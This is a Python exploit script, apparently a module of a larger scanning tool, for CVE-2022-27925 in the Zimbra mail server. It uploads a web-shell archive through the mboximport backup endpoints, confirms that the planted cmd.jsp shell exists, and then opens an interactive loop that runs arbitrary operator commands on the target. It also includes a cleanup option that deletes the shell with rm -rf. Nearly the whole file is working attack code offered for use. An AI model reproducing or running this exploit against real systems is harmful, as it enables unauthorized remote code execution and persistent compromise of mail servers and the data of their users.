import requests
from urllib3.exceptions import InsecureRequestWarning
from libs.public.reqset import ReqSet
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)



class Cve_2022_27925Poc2:
    def exploit(self,url, endpoint):
        headers = {
            'User-Agent': self.header,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        msg = """
        Exploit was successful!

        Send "exit" to exit the shell
        Send "deleteme" to delete the shell
        """
        with open("./cve/Zimbra/webshell.zip", 'rb') as payload:

            try:
                req = requests.post(url + endpoint, timeout=60, data=payload,
                                    verify=self.ssl,proxies=self.proxy, headers=headers)

                if req.status_code == 401:
                    check_req = requests.get(url + "/zimbraAdmin/cmd.jsp")
                    if check_req.status_code == 200:
                        print(msg)
                        while True:
                            command = input(">>> ")
                            if command == "exit":
                                break
                            if command == "deleteme":
                                requests.get(url + "/zimbraAdmin/cmd.jsp?cmd=rm -rf /opt/zimbra/jetty/webapps/zimbraAdmin/cmd.jsp")
                                break
                            req = requests.get(url + "/zimbraAdmin/cmd.jsp?cmd=" + command,verify=self.ssl, proxies=self.proxy, headers=headers)
                            try:
                                print(req.text.split('<BR>')[
                                      1].split('</pre>')[0].strip())
                            except:
                                print("Command failed to execute")

                        return True

            except Exception as e:
                print(e)


    def main(self,target):
        flag = False
        url = target[0].strip("/ ")
        self.ssl = target[1]

        self.header = target[2]

        proxy = target[3]

        req = ReqSet(proxy=proxy)

        self.proxy = req["proxy"]

        endpoints = ["/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd",
                     "/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1"]
        for endpoint in endpoints:
            flag = self.exploit(url, endpoint)
            if flag:
                break
        if not flag:
            print("Exploit failed!")
